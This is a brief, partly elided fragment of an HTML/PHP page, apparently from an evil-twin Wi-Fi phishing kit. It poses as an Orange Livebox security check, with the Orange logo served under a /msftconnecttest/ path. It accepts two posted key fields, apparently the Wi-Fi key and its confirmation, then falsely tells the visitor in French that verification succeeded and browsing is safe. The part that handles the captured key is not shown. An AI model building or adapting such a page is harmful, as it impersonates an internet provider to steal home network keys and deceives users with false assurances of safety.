...
<body>
<img name="logo" src="/msftconnecttest/imageslvb/menu/logoorange.jpg" width="300" height="200"></td>
	 <?php
            if (!empty($_POST['cle']) && !empty($_POST['cleconf']) ) // Vérifie si les variables des clés ne sont pas vides
        {
			...
			<p>
La v&eacute;rification a &eacute;t&eacute; correctement effectu&eacute;e vous pouvez reprendre la navigation internet en toute s&eacute;curit&eacute; avec votre Livebox d'Orange.</p>
<?php
                }
